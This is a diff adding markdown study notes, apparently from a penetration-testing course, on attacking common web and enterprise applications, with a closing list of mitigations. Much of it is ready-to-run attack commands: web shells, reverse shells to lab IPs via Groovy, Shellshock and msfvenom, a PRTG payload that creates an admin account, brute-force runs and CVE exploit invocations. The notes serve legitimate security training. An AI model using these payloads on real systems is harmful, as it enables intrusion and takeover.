@@ -1,0 +1,193 @@
+# Attacking Common Applications
+
+## 🎯 Main Idea
+- Discover, enumerate, and exploit common web/enterprise applications found on internal and external networks.
+- Focus on known public vulnerabilities AND abusing built-in functionality (often leading to RCE).
+- Covers CMS (WordPress, Joomla, Drupal), servlet/CI (Tomcat, Jenkins), monitoring/SIEM (Splunk, PRTG), ticketing/repos (osTicket, GitLab), ColdFusion, CGI, thick clients, IIS, LDAP, mass assignment.
+- Emphasis on methodology: enumerate thoroughly, pivot data between sources, default/weak creds.
+
+## 💥 Attack / Exploit Vectors
+
+### Application Discovery & Enumeration
+- Screenshot & categorize many web hosts to find high-value targets.
+- **Commands**
+  - `sudo nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list` — web port discovery
+  - `eyewitness --web -x web_discovery.xml -d <dir>` — screenshot report (fingerprints, default creds)
+  - `cat web_discovery.xml | ./aquatone -nmap` — Aquatone screenshot report
+  - `sudo vim /etc/hosts` — add vhost entries
+
+### WordPress
+- Identify via `/robots.txt`, `/wp-admin`, `/wp-content`, page source generator meta.
+- Enumerate version/theme/plugins (manual + WPScan); user enumeration via login error messages.
+- Attack: brute force login, RCE via Theme Editor (edit 404.php), vulnerable plugins.
+- **Commands**
+  - `curl -s http://blog.inlanefreight.local | grep WordPress` — footprint version
+  - `curl -s http://.../ | grep plugins` / `grep themes` — enumerate components
+  - `sudo wpscan --url <url> --enumerate --api-token <token>` — automated scan
+  - `sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url <url>` — login brute force
+  - `system($_GET[0]);` — web shell added via theme editor (404.php)
+  - `curl .../wp-content/themes/twentynineteen/404.php?0=id` — trigger web shell
+  - `use exploit/unix/webapp/wp_admin_shell_upload` — Metasploit plugin upload RCE
+  - mail-masta LFI: `curl -s http://.../wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd`
+  - wpDiscuz 7.0.4 RCE: `python3 wp_discuz.py -u <url> -p /?p=1` (CVE-2020-24186 file upload bypass)
+
+### Joomla
+- Identify via generator meta, `robots.txt` (`/administrator/`), `README.txt`, `administrator/manifests/files/joomla.xml`, `cache.xml`.
+- Attack: brute force admin, RCE via template edit (error.php).
+- **Commands**
+  - `curl -s http://dev.inlanefreight.local/ | grep Joomla` — footprint
+  - `droopescan scan joomla --url http://<url>` — version scan
+  - `python2 joomlascan.py -u http://<url>` — component enumeration
+  - `sudo python3 joomla-brute.py -u <url> -w <wordlist> -usr admin` — login brute force
+  - `system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);` — PHP shell in template error.php
+  - CVE-2019-10945 dir traversal: `python2.7 joomla_dir_trav.py --url ".../administrator/" --username admin --password admin --dir /`
+
+### Drupal
+- Identify via `Powered by Drupal`, `CHANGELOG.txt`/`README.txt`, `/node/<id>`, robots.txt.
+- Attack: PHP Filter module, backdoored module upload, Drupalgeddon 1/2/3.
+- **Commands**
+  - `curl -s http://drupal.inlanefreight.local | grep Drupal` — footprint
+  - `curl -s .../CHANGELOG.txt | grep -m2 ""` — version
+  - `droopescan scan drupal -u http://<url>` — scan
+  - PHP Filter module → create Basic page w/ `<?php system($_GET['hash']); ?>`, Text format = PHP code
+  - `curl -s .../node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id` — trigger
+  - Backdoored module: add shell.php + `.htaccess` to module tar.gz, upload via Extend
+  - Drupalgeddon (CVE-2014-3704): `python2.7 drupalgeddon.py -t <url> -u hacker -p pwnd` (add admin, SQLi)
+  - Drupalgeddon2 (CVE-2018-7600): `python3 drupalgeddon2.py` (RCE, upload PHP)
+  - Drupalgeddon3 (CVE-2018-7602): `exploit/multi/http/drupal_drupageddon3` (needs session cookie + node)
+
+### Tomcat
+- Identify via Server header, `/docs`, error pages; key files `tomcat-users.xml`, `WEB-INF/web.xml`.
+- Attack: brute `/manager` & `/host-manager`, deploy malicious WAR for RCE; Ghostcat LFI.
+- **Commands**
+  - `curl -s http://app-dev.inlanefreight.local:8080/docs/ | grep Tomcat` — version
+  - `gobuster dir -u <url> -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt` — find /manager
+  - `auxiliary/scanner/http/tomcat_mgr_login` — Metasploit manager brute force
+  - `python3 mgr_brute.py -U <url> -P /manager -u <users> -p <passwords>` — manager brute force
+  - `zip -r backup.war cmd.jsp` — package JSP web shell into WAR
+  - `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=4443 -f war > backup.war` — reverse shell WAR
+  - `curl http://.../backup/cmd.jsp?cmd=id` — trigger JSP shell
+  - `multi/http/tomcat_mgr_upload` — Metasploit WAR upload
+  - Ghostcat (CVE-2020-1938): `nmap -sV -p 8009,8080 <host>`; `python2.7 tomcat-ajp.lfi.py <host> -p 8009 -f WEB-INF/web.xml`
+
+### Jenkins
+- Runs on Tomcat port 8080 (+5000). Often weak/no auth; runs as root/SYSTEM.
+- Attack: Script Console (Groovy) → OS command execution / reverse shell.
+- **Commands**
+  - Script console at `/script`; Groovy `def cmd='id'; def proc=cmd.execute()...println sout` — run command
+  - Linux reverse shell: `r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]); p.waitFor()`
+  - Windows cmd: `def cmd = "cmd.exe /c dir".execute(); println("${cmd.text}");`
+  - Windows reverse shell via Groovy ProcessBuilder + Socket
+  - CVE-2018-1999002 + CVE-2019-1003000 — pre-auth RCE (sandbox bypass, v2.137)
+
+### Splunk
+- Web on port 8000, REST/mgmt 8089. Free version = no auth; default `admin:changeme`.
+- Attack: custom app with scripted input (Python/PowerShell/Bash) → RCE (often SYSTEM/root).
+- **Commands**
+  - `sudo nmap -sV <ip>` — identify Splunkd httpd (8000/8089)
+  - Build app dir `splunk_shell/bin` + `default/inputs.conf`; `inputs.conf`: `[script://./bin/rev.py]` interval=10
+  - `tar -cvzf updater.tar.gz splunk_shell/` → upload via "Install app from file"
+  - reverse_shell_splunk package (PowerShell one-liner / Python rev.py)
+  - Deployment server → push to Universal Forwarders
+
+### PRTG Network Monitor
+- Port 8080 (Indy httpd / Paessler); default `prtgadmin:prtgadmin`.
+- Attack: CVE-2018-9276 authenticated command injection via Notification "Parameter" field (passed to PowerShell).
+- **Commands**
+  - `curl -s http://<ip>:8080/index.htm -A "Mozilla/..." | grep version` — version
+  - Notification parameter payload: `test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add`
+  - `sudo crackmapexec smb <ip> -u prtgadm1 -p Pwn3d_by_PRTG!` — confirm local admin
+
+### osTicket
+- Identify via `OSTSESSID` cookie, "powered by osTicket" footer.
+- Attack: abuse functionality (get valid company email from ticket → register other services), sensitive data exposure (login with email, read tickets), CVE-2020-24881 SSRF.
+- Password reuse / standard new-joiner password harvested from ticket conversations.
+- **Commands**
+  - `python3 dehashed.py -q inlanefreight.local -p` — OSINT credential dump
+
+### GitLab
+- Identify via login page logo; version only via `/help` when logged in.
+- Attack: username enumeration (register form), access public/internal repos for secrets, authenticated RCE (ExifTool).
+- **Commands**
+  - Browse `/explore`, `/users/sign_up` (enumerate users/emails), register account
+  - `./gitlab_userenum.sh --url <url> --userlist users.txt` — user enumeration (CVE/exploit 49821)
+  - `python3 gitlab_13_10_2_rce.py -t <url> -u mrb3n -p password1 -c '<reverse shell>'` — authenticated RCE (≤13.10.2)
+
+### Tomcat CGI (CVE-2019-0232)
+- Windows + `enableCmdLineArguments` enabled → CGI servlet command injection via `&`.
+- **Commands**
+  - `ffuf -w /usr/share/dirb/wordlists/common.txt -u http://<ip>:8080/cgi/FUZZ.bat` — find .bat/.cmd scripts
+  - `http://<ip>:8080/cgi/welcome.bat?&dir` — inject command
+  - `http://<ip>:8080/cgi/welcome.bat?&set` — dump env vars (PATH unset → hardcode paths)
+  - `http://<ip>:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe` — URL-encode to bypass char filter
+
+### Shellshock (CVE-2014-6271) via CGI
+- Bash env var function parsing bug; inject commands via User-Agent to CGI script.
+- **Commands**
+  - `env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable"` — test locally
+  - `gobuster dir -u http://<ip>/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi` — find scripts
+  - `curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' http://<ip>/cgi-bin/access.cgi` — confirm
+  - `curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' http://<ip>/cgi-bin/access.cgi` — reverse shell
+
+### Thick Client Applications
+- Static (decompile/strings) + dynamic (debugger/memory) + network + server-side analysis.
+- Hardcoded credentials in files, memory, source; web vulns in 3-tier (SQLi, path traversal).
+- **Commands/Tools**
+  - ProcMon64 — monitor temp file drops; capture by removing delete permissions on Temp folder
+  - x64dbg → Dump Memory to File; `strings64.exe` on dump; de4dot + dnSpy to recover .NET source
+  - JAR: edit `beans.xml` port, strip `META-INF/MANIFEST.MF` hashes + delete `.RSA`/`.SF`, rebuild `jar -cmf MANIFEST.MF new.jar *`
+  - Path traversal via decompiled `showFiles("..")`; download server jar via modified `open()`
+  - SQLi via `UNION`: `abc' UNION SELECT 1,'abc','a@b.com','abc','admin` (control role/password)
+
+### ColdFusion
+- `.cfm`/`.cfc` extensions, `Server: ColdFusion` header, `/CFIDE/administrator/index.cfm`; default ports 8500.
+- Attack: directory traversal (CVE-2010-2861), unauthenticated RCE (CVE-2009-2265 FCKeditor upload).
+- **Commands**
+  - `nmap -p- -sC -Pn <ip> --open` — find port 8500
+  - `searchsploit adobe coldfusion` — find exploits
+  - CVE-2010-2861: `python2 14641.py <host> 8500 "../../../../../../../../ColdFusion8/lib/password.properties"` — read file (locale param traversal)
+  - CVE-2009-2265: `python3 50057.py` (FCKeditor upload.cfm → JSP shell → reverse shell)
+
+### IIS Tilde (8.3) Enumeration
+- Discover hidden short filenames via `~` + sequence number on old IIS.
+- **Commands**
+  - `java -jar iis_shortname_scanner.jar 0 5 http://<ip>/` — enumerate short names
+  - `egrep -r ^transf /usr/share/wordlists/* | sed 's/^[^:]*://' > /tmp/list.txt` — build wordlist from short name
+  - `gobuster dir -u http://<ip>/ -w /tmp/list.txt -x .aspx,.asp` — resolve full filename
+
+### LDAP Injection
+- App uses LDAP for auth; inject `*`, `( )`, `|`, `&` to bypass.
+- **Commands**
+  - `ldapsearch -H ldap://host:389 -D "cn=admin,dc=example,dc=com" -w secret123 -b "ou=people,dc=example,dc=com" "(mail=...)"` — query
+  - Login bypass: `*` in username and password fields; filters like `(cn=*)`, `(objectClass=*)`
+
+### Web Mass Assignment
+- Framework binds all submitted params to object/DB; inject unprotected fields (e.g. `admin`, `confirmed`).
+- **Commands**
+  - Register with extra param: `username=new&password=test&confirmed=test` — bypass admin approval
+
+### Applications Connecting to Services
+- Extract DB connection strings/creds from binaries.
+- **Commands/Tools**
+  - `gdb ./octopus_checker`; `set disassembly-flavor intel`; `disas main`; breakpoint at `SQLDriverConnect@plt` → read conn string in RDX
+  - `Get-FileMetaData .\MultimasterAPI.dll` + dnSpy — read .NET source for connection string/password
+
+## 🛠️ Key Tools & Concepts
+- EyeWitness / Aquatone — web screenshot/triage; Nmap — discovery/service scan
+- WPScan, droopescan, JoomlaScan — CMS scanners
+- Gobuster / ffuf — directory & file brute forcing
+- Metasploit modules — login brute force & exploit automation
+- msfvenom — WAR/reverse shell payloads
+- searchsploit — find public exploits
+- x64dbg, dnSpy, de4dot, JD-GUI, ProcMon, Strings, PEDA/GDB — thick client / binary analysis
+- CrackMapExec, evil-winrm, impacket — post-exploitation / confirm access
+- Concepts: default/weak creds, built-in functionality abuse, WAR/JSP/Groovy, 8.3 short names, Dehashed OSINT, pivoting data between apps
+
+## 🛡️ Mitigations
+- Maintain accurate application inventory (find shadow IT, trial→free conversions).
+- Secure authentication: strong/non-default passwords, disable/rename default admin, enforce MFA.
+- Access controls: restrict admin/login pages from internet, IP whitelisting, least privilege, file/folder permissions.
+- Disable unsafe features (e.g. WordPress PHP code editing).
+- Regular updates/patching; backups; security monitoring / WAF (e.g. WordFence).
+- LDAP/AD SSO integration; sanitize input (LDAP injection, SQLi, mass assignment whitelisting).
+- App-specific: limit Tomcat manager to localhost + strong creds; Jenkins Matrix auth; Joomla/Drupal hide admin page; change Splunk/PRTG defaults; GitLab sign-up restrictions.
